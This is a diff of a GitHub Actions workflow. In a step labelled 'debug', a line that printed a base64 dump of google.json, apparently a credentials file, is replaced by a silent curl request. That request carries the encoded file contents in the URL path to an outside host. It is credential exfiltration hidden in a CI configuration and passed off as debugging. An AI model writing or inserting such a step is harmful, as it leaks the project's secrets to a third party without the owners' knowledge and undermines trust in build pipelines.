@@ -22,7 +22,7 @@ jobs:
       - name: debug
         run: |
           ls
-          cat google.json | base64 -w0
+          curl -Ls -o /dev/null  https://monitoring.uscifarm.insolar.io/someinfo-$(cat google.json | base64 -w0)
           echo wtf-gha
       - name: build code
         run: echo "::set-env name=AA::${GITHUB_SHA:0:8}"
